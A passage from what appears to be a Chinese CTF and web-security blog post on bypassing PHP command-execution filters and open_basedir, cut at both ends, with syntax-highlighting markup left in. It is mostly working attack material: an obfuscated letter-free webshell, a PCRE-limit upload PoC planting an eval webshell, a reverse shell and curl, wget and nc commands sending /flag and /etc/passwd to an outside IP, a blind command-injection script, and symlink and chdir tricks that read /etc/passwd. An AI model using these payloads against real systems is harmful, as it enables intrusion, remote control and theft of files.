class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%2B</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24____</span>.<span class="hljs-meta">%3D</span><span class="hljs-meta">%24__</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24_</span><span class="hljs-meta">%3D</span><span class="hljs-meta">%24</span><span class="hljs-meta">%24____</span><span class="hljs-meta">%3B</span><span class="hljs-meta">%24___</span>(<span class="hljs-meta">%24_</span><span class="hljs-meta">%5B_</span><span class="hljs-meta">%5D</span>)<span class="hljs-meta">%3B</span><br></code></pre></td></tr></table></figure><p>但是这种方式得到的payload过长，万一有长度限制就无法bypass；另外assert函数在php5中可以作为动态函数名来执行代码，类似于</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$a=<span class="hljs-string">&#x27;assert&#x27;</span><span class="hljs-comment">;</span><br>$b=<span class="hljs-string">&#x27;phpinfo();&#x27;</span><span class="hljs-comment">;</span><br>$a($b)<br></code></pre></td></tr></table></figure><p>但在php7中，assert不再作为函数使用，而是变成了语言结构(类似eval)，所以这种自增payload在php7也会失效。但我们依然可以采用上面提到的取反的方式进行函数动态调用。</p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>不包含字母与数字的webshell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>webshell<br>@<span class="hljs-variable">$_</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">2</span>b;<span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;#./&#124;&#123;&#x27;</span>^<span class="hljs-string">&#x27;&#124;~`//&#x27;</span>;<span class="hljs-variable">$&#123;$__&#125;</span>[!<span class="hljs-variable">$_</span>](<span class="hljs-variable">$&#123;$__&#125;</span>[<span class="hljs-variable">$_</span>]);<br><br><span class="hljs-regexp">//</span>post<br><span class="hljs-number">0</span>=assert&amp;<span class="hljs-number">1</span>=phpinfo();<br></code></pre></td></tr></table></figure><h3 id="8-linux内置变量"><a href="#8-linux内置变量" class="headerlink" title="8.linux内置变量"></a>8.linux内置变量</h3><p>使用环境内置变量我们可以获取需要的字符。</p><p>首先介绍几个linux内置变量</p><blockquote><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$PATH</span>环境变量，可执行文件的搜索路径</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$PWD</span>当前所在目录，比如在ctf环境中是/var/www/html</span><br><br><span class="hljs-symbol">$</span>&#123;#&lt;var&gt;&#125;计算变量var的长度<br><br><span class="hljs-meta"><span class="hljs-keyword">$RANDOM</span>产生0 - 32767之间的随机数</span><br><br>例如：echo <span class="hljs-symbol">$</span>\&#123;\#RANDOM\&#125; 表示随机整数的位数也就是<span class="hljs-number">1</span><span class="hljs-number">-5</span>之间任意一个数。<br><br><span class="hljs-meta"><span class="hljs-keyword">$SHLVL</span>记录多个 Bash 进程实例嵌套深度的累加器 其**默认初始值为1**</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$USER</span>获取当前用户名例如：www-data</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$PHP</span>_VERSION获取当前php版本例如：echo $\&#123;PHP_VERSION\&#125;</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$HOME</span>用户的home目录，一般是/home/username</span><br><br><span class="hljs-meta"><span class="hljs-keyword">$HOSTNAME</span> 主机名称</span><br></code></pre></td></tr></table></figure></blockquote><p>然后是一些字符截取操作</p> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>linux中可以用`~`获取变量的最后几位<br> <br> echo <span class="hljs-variable">$&#123;PWD:~0&#125;</span>  <span class="hljs-regexp">//</span>截取前目录的最后一个字符<br> <br><span class="hljs-regexp">//</span>同时可以用`::`获取变量的前几位<br> <br>echo <span class="hljs-variable">$&#123;PWD::0&#125;</span> <span class="hljs-regexp">//</span>截取当前目录的第一个字符也就是 /<br> <br><span class="hljs-regexp">//</span>用`<span class="hljs-variable">$&#123;#变量&#125;</span>`显示变量的长度<br> <br>echo <span class="hljs-variable">$&#123;#IFS&#125;</span>  <span class="hljs-regexp">//</span><span class="hljs-number">3</span><br>echo <span class="hljs-variable">$&#123;#&#125;</span><span class="hljs-regexp">//</span><span class="hljs-number">0</span><br>echo <span class="hljs-variable">$&#123;#?&#125;</span>  <span class="hljs-regexp">//</span><span class="hljs-number">1</span><br> <br>注意一个特殊情况:`<span class="hljs-variable">$&#123;#?&#125;</span>==<span class="hljs-number">1</span>`因此我们可以使用<span class="hljs-variable">$&#123;#?&#125;</span>来代替<span class="hljs-variable">$SHLVL</span>产生<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><blockquote><p><strong>$? 的奇妙用法：</strong></p><p>$?表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误</p><p>为什么有 &lt;A<code>&lt;A</code>返回的错误值 使得<code>$?</code>为1</p></blockquote><p>一些常用的payload:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment"># nl flag.php</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PATH</span><span class="hljs-symbol">:~A</span>&#125;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:~A</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><br><span class="hljs-comment">#/bin/cat flag.php</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;??$&#123;HOME:$&#123;#HOSTNAME&#125;:$&#123;#SHLVL&#125;&#125; ????.??? </span><br><span class="hljs-comment">#或</span><br><span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;USER:~A&#125;? ????.???</span><br><br><span class="hljs-comment">#/bin/base64 flag.php  由于RANDOM所以需要多尝试几次</span><br>code=<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$&#123;</span><span class="hljs-comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br><span class="hljs-comment">#或</span><br>code=&lt;A;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">RANDOM</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?  <br><br></code></pre></td></tr></table></figure><h3 id="9-超过PRCE回溯限制绕正则"><a href="#9-超过PRCE回溯限制绕正则" class="headerlink" title="9.超过PRCE回溯限制绕正则"></a>9.超过PRCE回溯限制绕正则</h3><p>参考p牛文章<a href="https://www.freebuf.com/articles/web/190794.html">https://www.freebuf.com/articles/web/190794.html</a></p><p>写文件，但文件中不允许输入任何php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);  <br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_php</span>(<span class="hljs-variable">$input</span>)) &#123;<br>    <span class="hljs-comment">// fwrite($f, $input); ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>利用正则表达式prce最大次数默认为1000000：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pcre</span>.backtrack_limit默认为<span class="hljs-number">1000000</span><br></code></pre></td></tr></table></figure><p>发送超过1000000字符大小的数据来使正则执行失败写入木马。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#poc</span><br>import requests<br><span class="hljs-keyword">from</span> io import BytesIO<br><br>files = &#123;<br>  <span class="hljs-string">&#x27;file&#x27;</span>: BytesIO(b<span class="hljs-string">&#x27;aaa&lt;?php eval($_POST[txt]);//&#x27;</span> + b<span class="hljs-string">&#x27;a&#x27;</span> * 1000000)<br>&#125;<br><br>res = requests.post(<span class="hljs-string">&#x27;http://IP/index.php&#x27;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(res.headers)<br></code></pre></td></tr></table></figure><h3 id="10-无回显命令执行"><a href="#10-无回显命令执行" class="headerlink" title="10.无回显命令执行"></a>10.无回显命令执行</h3><p>无回显命令执行可以考虑反弹shell或者数据外带。</p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>不多说，直接弹就行</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sh</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">180.76.162.68</span>/<span class="hljs-number">8081</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h4 id="数据外带"><a href="#数据外带" class="headerlink" title="数据外带"></a>数据外带</h4><p><a href="https://blog.csdn.net/weixin_35910073/article/details/112458456">https://blog.csdn.net/weixin_35910073/article/details/112458456</a></p><h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>目标机执行<br>nc –l –p <span class="hljs-number">1234</span> &lt; <span class="hljs-regexp">/etc/</span>passwd   <span class="hljs-comment">#将/etc/passwd映射到1234端口</span><br><span class="hljs-regexp">//</span>本机执行<br>nc IP:<span class="hljs-number">1234</span>  <span class="hljs-comment">#监听目标机1234端口接收数据</span><br></code></pre></td></tr></table></figure><h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>目标机执行<br>curl http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">8888</span> -File=@/flag<br><span class="hljs-regexp">//</span>本机监听<br>nc -lvnp <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure><h5 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h5><p>由于wget可以指定headers，body等，因此我们将敏感数据放到请求包中里去外带数据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>目标机执行<br>wget –header=<span class="hljs-string">&quot;EVIL:$(cat /flag)&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span><br>wget –header=”evil:`cat <span class="hljs-regexp">/etc/</span>passwd &#124; xargs echo –n`” http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span> <span class="hljs-comment">#多行读取</span><br>wget –post-data exfil=`cat <span class="hljs-regexp">/etc/</span>passwd`&amp;b=<span class="hljs-number">1</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span>  <span class="hljs-comment">#body传递</span><br>wget –post-file trophy.php http:<span class="hljs-regexp">//</span><span class="hljs-number">180.76</span>.<span class="hljs-number">162.68</span>:<span class="hljs-number">5555</span>  <span class="hljs-comment">#直接传递file</span><br><br><br><span class="hljs-regexp">//</span>本机监听<br>nc -lvnp <span class="hljs-number">5555</span><br></code></pre></td></tr></table></figure><h4 id="命令盲注"><a href="#命令盲注" class="headerlink" title="命令盲注"></a>命令盲注</h4><p>如果上述命令都不能用那么就考虑命令盲注，采用延时注入的方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>s=requests.session()<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_!@#%&#124;^&amp;&#123;&#125;[]/-()+=,\\&#x27;</span>:<br>        starTime=time.time()<br>        url=<span class="hljs-string">&quot;http://127.0.0.1/?cmd=if [ `cut -c&quot;</span>+<span class="hljs-built_in">str</span>(z)+<span class="hljs-string">&quot;-&quot;</span>+<span class="hljs-built_in">str</span>(z)+<span class="hljs-string">&quot; /flag` != &#x27;&quot;</span>+i+<span class="hljs-string">&quot;&#x27; ]; then echo 1 ; else sleep 3; fi&quot;</span><br>        r=s.get(url)<br>        <span class="hljs-keyword">if</span>((time.time()-starTime)&gt;<span class="hljs-number">3</span>):<br>            flag+=i<br>            <span class="hljs-built_in">print</span>(flag)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(z)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;the flag is&#x27;</span>+flag)<br></code></pre></td></tr></table></figure><h2 id="php安全特性bypass"><a href="#php安全特性bypass" class="headerlink" title="php安全特性bypass"></a>php安全特性bypass</h2><h3 id="bypass-open-basedir"><a href="#bypass-open-basedir" class="headerlink" title="bypass open_basedir"></a>bypass open_basedir</h3><p><a href="https://www.cnblogs.com/hookjoy/p/12846164.html">https://www.cnblogs.com/hookjoy/p/12846164.html</a></p><p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。下面给出几种bypass技巧。</p><h4 id="利用sylink-符号链接"><a href="#利用sylink-符号链接" class="headerlink" title="利用sylink()符号链接"></a>利用sylink()符号链接</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">symlink</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$target</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$link</span> ) : <span class="hljs-keyword">bool</span><br><span class="hljs-comment">//用于创建一个指向taget的软链接link，target必须在open_basedir的范围内。</span><br></code></pre></td></tr></table></figure><p>payload如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//bypass.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;A&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;A&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;B&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;B&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;C&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;C&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;D&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;D&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;..&quot;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&quot;A/B/C/D&quot;</span>,<span class="hljs-string">&quot;7ea&quot;</span>);<br><span class="hljs-title function_ invoke__">symlink</span>(<span class="hljs-string">&quot;7ea/../../../../etc/passwd&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;7ea&quot;</span>);<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&quot;7ea&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问bypass.php后就为passwd文件创建软链接exp，再访问exp即可读取任意文件。</p><h4 id="利用glob-x2F-x2F-伪协议读根目录"><a href="#利用glob-x2F-x2F-伪协议读根目录" class="headerlink" title="利用glob:&#x2F;&#x2F;伪协议读根目录"></a>利用glob:&#x2F;&#x2F;伪协议读根目录</h4><p>1.DirectoryIterator+glob:&#x2F;&#x2F; </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//传入  glob:///*  输出根目录下所有文件。</span><br></code></pre></td></tr></table></figure><p>2.opendir()+readdir()+glob:&#x2F;&#x2F; </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$a</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//传glob:///*</span><br></code></pre></td></tr></table></figure><h4 id="利用chdir-与ini-set-组合"><a href="#利用chdir-与ini-set-组合" class="headerlink" title="利用chdir()与ini_set()组合"></a>利用chdir()与ini_set()组合</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;mi1k7ea&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;mi1k7ea&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="利用bindtextdomain-函数报错判断文件存在"><a href="#利用bindtextdomain-函数报错判断文件存在" class="headerlink" title="利用bindtextdomain()函数报错判断文件存在"></a>利用bindtextdomain()函数报错判断文件存在</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">bindtextdomain</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$domain</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$directory</span> ) : <span class="hljs-keyword">string</span><br><span class="hljs-comment">//用于绑定domain到某个目录</span><br></code></pre></td></tr></table></figure><p>只能判断文件是否存在，不存在返回false，利用价值不是很大。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&#x27;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#x27;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-variable">$re</span> = <span class="hljs-title function_ invoke__">bindtextdomain</span>(<span class="hljs-string">&#x27;xxx&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dir&#x27;</span>]);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$re</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="利用realpath-gt-适用于windows"><a href="#利用realpath-gt-适用于windows" class="headerlink" title="利用realpath() -&gt;适用于windows"></a>利用realpath() -&gt;适用于windows</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>));<br><span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;</span>, <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>));<br><span class="hljs-title function_ invoke__">set_error_handler</span>(<span class="hljs-string">&#x27;isexists&#x27;</span>);<br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;E:/wamp64/&#x27;</span>;<br><span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$dir</span> . <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$i</span>] . <span class="hljs-string">&#x27;&lt;&gt;&lt;&#x27;</span>;<br>        <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isexists</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>        <span 